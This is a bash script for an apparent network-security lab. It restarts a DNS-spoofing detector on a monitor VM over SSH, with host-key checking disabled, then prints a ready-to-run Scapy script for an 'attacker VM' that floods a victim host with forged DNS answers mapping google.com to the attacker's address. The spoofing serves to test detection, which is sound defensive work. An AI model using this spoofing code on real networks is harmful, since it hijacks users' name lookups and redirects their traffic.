#!/bin/bash
# File Sync & System Restart Instructions
# Run these commands in your Monitor VM terminal

echo "════════════════════════════════════════════════════════════════"
echo "  MONITOR VM - APPLY DNS BASELINE FIX"
echo "════════════════════════════════════════════════════════════════"

# Step 1: Stop the production system
echo ""
echo "Step 1: Stopping production system..."
ssh -o StrictHostKeyChecking=no monitor@192.168.128.8 << 'STEP1'
  echo "Stopping any running production system..."
  sudo pkill -f "python3.*production_main" 2>/dev/null || true
  sleep 2
  echo "✅ Production system stopped"
STEP1

# Step 2: Verify files synced
echo ""
echo "Step 2: Verifying synced files..."
ssh -o StrictHostKeyChecking=no monitor@192.168.128.8 << 'STEP2'
  echo "Checking Monitor VM files:"
  ls -lh ~/securenet/{dns_spoof_attack.py,DNS_DETECTION_GUIDE.md,DNS_FIX_SUMMARY.md} 2>/dev/null
  echo ""
  echo "Checking if production_system.py has baseline fix:"
  grep -c "_initialize_detector_baselines" ~/securenet/lan_security_system/core/production_system.py && echo "✅ Baseline fix present" || echo "❌ Baseline fix missing"
STEP2

# Step 3: Restart production system
echo ""
echo "Step 3: Restarting production system WITH baseline initialization..."
ssh -o StrictHostKeyChecking=no monitor@192.168.128.8 << 'STEP3'
  cd ~/securenet
  echo "Starting production system on enp0s1..."
  sudo python3 production_main.py --interactive --interface enp0s1 --config production_config.yaml --log-level INFO &
  sleep 3
  echo ""
  echo "✅ Production system restarted with DNS baseline fix"
  echo ""
  echo "Monitor is now ready to detect DNS attacks!"
  echo "Baselines initialized for:"
  echo "  • google.com → 8.8.8.8"
  echo "  • cloudflare.com → 1.1.1.1"
  echo "  • dns.google → 8.8.8.8"
  echo ""
  echo "Next: Execute DNS attack from Attacker VM"
STEP3

echo ""
echo "════════════════════════════════════════════════════════════════"
echo "  SUMMARY"
echo "════════════════════════════════════════════════════════════════"
echo ""
echo "✅ Monitor VM files synced with DNS baseline fix"
echo "✅ Production system restarted with baseline initialization"
echo ""
echo "⏭️  NEXT STEP: Run DNS attack on Attacker VM"
echo ""
echo "Command to run on ATTACKER VM (192.168.128.101):"
echo "────────────────────────────────────────────────"
echo ""
echo 'python3 << '"'"'EOF'"'"''
echo 'from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendp'
echo 'import random, time'
echo ''
echo 'iface = "eth0"'
echo 'attacker = "192.168.128.101"'
echo 'victim = "192.168.128.6"'
echo 'print("🔥 Sending DNS spoof attack...")'
echo 'for i in range(50):'
echo '    pkt = IP(src=attacker, dst=victim) / \'
echo '          UDP(sport=53, dport=random.randint(10000,60000)) / \'
echo '          DNS(id=random.randint(0,65535), qr=1, rd=1, ra=1,'
echo '              qd=DNSQR(qname="google.com"),'
echo '              an=DNSRR(rrname="google.com", ttl=10, rdata=attacker))'
echo '    sendp(pkt, iface=iface, verbose=False)'
echo '    time.sleep(0.1)'
echo 'print("✅ 50 DNS spoof packets sent!")'
echo 'EOF'
echo ""
echo "════════════════════════════════════════════════════════════════"
